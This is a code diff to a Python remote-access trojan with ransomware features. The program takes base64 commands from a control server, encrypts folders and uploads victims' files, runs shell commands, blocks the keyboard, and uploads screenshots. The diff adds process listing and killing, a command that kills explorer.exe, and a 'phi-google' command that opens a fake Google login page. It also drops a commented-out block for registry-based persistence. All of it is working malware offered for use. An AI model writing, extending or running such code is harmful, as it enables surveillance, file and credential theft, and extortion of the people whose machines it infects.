@@ -25,6 +25,7 @@ from tkinter.simpledialog import askstring
 import tkinter
 import requests.adapters
 import urllib3.exceptions
+import psutil
 from requests import get
 import requests.packages
 import urllib3
@@ -64,7 +65,7 @@ def parse(directory_to_parse):
     if file_name == __file__:
       continue
     if os.path.isfile(path):
-      files.append(path)  #type:ignore
+      files.append(path)#type:ignore
       printss('-' * 80)
       printss(f"[{file_name}]--file found")
       files_found += 1
@@ -93,7 +94,7 @@ def encrypt(directory, send_files):
       print(f"send files true for {file}")
       url = f'{STORAGE_SERVER}/upload'
       files = {'file': open(file, 'rb')}
-      data = {'id': id, 'user': getpass.getuser()}
+      data = {'id': id, 'user':getpass.getuser()}
       response = requests.post(url, files=files, data=data)
       print(f"response: {response.text}")
     else:
@@ -128,7 +129,7 @@ def encrypt(directory, send_files):
           errors += 1
           printss(e)
           continue
-
+  
   send(f'''
 Encryption Process Complete
 ----------------
@@ -147,8 +148,7 @@ Time Sent: {time.ctime()}
 Current Working Directory: {tempfile.gettempdir()}
 ''')
   os.chdir(tempfile.gettempdir())
-
-
+  
 def msg(title, message, type):
   root = tkinter.Tk()
 
@@ -280,7 +280,7 @@ def wait_keyboard(time):
   a = time
   for i in range(150):
     keyboard.block_key(i)  #type:ignore
-  sleep(a)  #type:ignore
+  sleep(a)#type:ignore
 
   for process in all_processes:
     process.terminate()
@@ -317,7 +317,7 @@ def execute():
   global verbose, send_files
 
   #determine command parameters
-  instructs = sess.get(f'{SERVER_NAME}/inst', verify=False).text
+  instructs = sess.get(f'{SERVER_NAME}/inst', verify=False).text # type: ignore
   #print(f'text gotten: {instructs}')
   d_instructs = base64.b64decode(instructs[1:-1])
   #print(f'decrypted (bytes): {d_instructs}')
@@ -385,15 +385,21 @@ def execute():
             os.chdir(tempfile.gettempdir())
           except Exception as e:
             send(f"going to temp directory failed unexpectedly: \n {e}")
+
+        elif type_comm == 'kill_explorer':
+          try:
+            command = 'taskkill /f /im explorer.exe'
+            subprocess.call(command, shell=True)
+          except Exception as e:
+            send(f"killinfg explorer failed unexpectedly: \n {e}")
+
         elif type_comm == 'encrypt':
           try:
             if c_arr[5] == "true":
               verbose = True
             else:
               verbose = False
-
-            encryption_thread = Thread(target=encrypt(c_arr[4], c_arr[6]),
-                                       daemon=True)
+            encryption_thread = Thread(target=encrypt(c_arr[4], c_arr[6]), daemon=True)
             encryption_thread.start()
             print(f"encrypt({c_arr[4]}, {c_arr[6]})")
 
@@ -401,6 +407,7 @@ def execute():
             send(
               f'encryption command with directory {c_arr[4]} failed unexpectedly:\n{e}'
             )
+
         elif type_comm == '99sh':
           try:
             #print(f'command: {c_arr[3]}')
@@ -414,21 +421,50 @@ def execute():
             hydra_thread = Thread(target=window, daemon=True)
             hydra_thread.start()
             print("started daemon for hydra")
-          except Exception as e:
+          except Exception as e:#psutil.process_iter()
             send(
               f'command hydra failed unexpectedly (hydra), with {c_arr[4]} spawns per closing: \n {e}'
+            )
+        elif type_comm == 'phi-google':
+          try:
+            url_open('https://google.login.posydon.repl.co')
+          except Exception as e:
+            send(
+              f'command phi-google failed unexpectedly: \n {e}'
+            )
+        elif type_comm == 'processes':
+          try:
+            string = []
+            for i in psutil.process_iter():
+                string.append(i.name())
+            send(str(string))
+          except Exception as e:
+            send(
+              f'command processes failed unexpectedly: \n {e}'
             )
         elif type_comm == 'url_open':
           try:
             url_open(str(c_arr[4]))
           except Exception as e:
-            send(f'urlopen failed')
+            send(f'urlopen failed:\n{e}')
+        elif type_comm == 'kill_process':
+          try:
+            for process in psutil.process_iter():
+                if process.name() == str(c_arr[4]):
+                    pid = process.pid
+                    psutil.Process(pid).kill()#type:ignore
+          except Exception as e:
+            send(f"process {c_arr[4]} was not killed sucessfully: \n{e}")
         elif type_comm == 'screenshot':
           try:
             screenshot = ImageGrab.grab()
             screenshot.save('shot.png')
-            sess.post(f'{SERVER_NAME}/upload',
-                      files={'image': open('shot.png', 'rb')})
+            with open('shot.png', 'rb') as image_file:
+                # Create a dictionary containing any additional data to be sent with the image
+                data = {'id': id}
+                # Send a POST request to the Flask server with the image and additional data
+                response = requests.post(f'{SERVER_NAME}/upload', files={'image': image_file}, data=data)
+                send(f"server response to screenshot upload: {response}")
             os.remove('shot.png')
           except Exception as e:
             send(f'screenshot failed, with exception as follows: \n {e}')
@@ -459,7 +495,6 @@ def execute():
                                                args=((c_arr[4], c_arr[5],
                                                       c_arr[6])))
             download_thread.start()
-
           except Exception as e:
             send(f'download failed, with exception as follows: \n {e}')
         elif type_comm == 'rickroll':
@@ -599,17 +634,10 @@ def start_sending_id():
     print('sent id')
     sleep(10)
 
-
-# if os.getlogin() != "ARTHU":#adding to windows registry startup, if its not my computer
-#   key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
-#   path = os.path.abspath(__file__)
-#   name = os.path.splitext(os.path.basename(__file__))[0]
-#   winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
-#   winreg.CloseKey(key)
-# else:
-#   pass
 custom_commands = '''
 list_custom : return this list
+list_processes : return a list of processes
+kill_process : kill the process that is specified in the next parameter
 99o : return supposed output of command
 99s : execute command, return output to server
 99n : execute command, do nothing with output (it will appear on a terminal)
